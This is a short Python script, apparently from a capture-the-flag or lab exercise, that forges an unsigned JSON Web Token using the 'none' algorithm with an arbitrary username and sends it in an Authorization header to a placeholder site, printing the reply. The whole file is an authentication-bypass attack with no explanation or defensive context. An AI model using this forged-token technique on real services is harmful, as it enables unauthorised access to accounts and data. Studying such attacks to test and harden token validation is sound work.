#!/usr/bin/env python
# coding=utf-8

import jwt
import requests


#jwt_token = jwt.encode( {'username':'whatever', 'iat':'0'}, key='something_wedontcare', algorithm='HS256')
jwt_token = jwt.encode( {'username':'whatever', 'iat':'0'}, key=None, algorithm=None)

jwt_token = jwt_token.decode('UTF-8')

headers = {'Authorization': f'Beaver {jwt_token}'}

print(jwt_token)
r = requests.get('http://site/', headers=headers)

print(r.text)

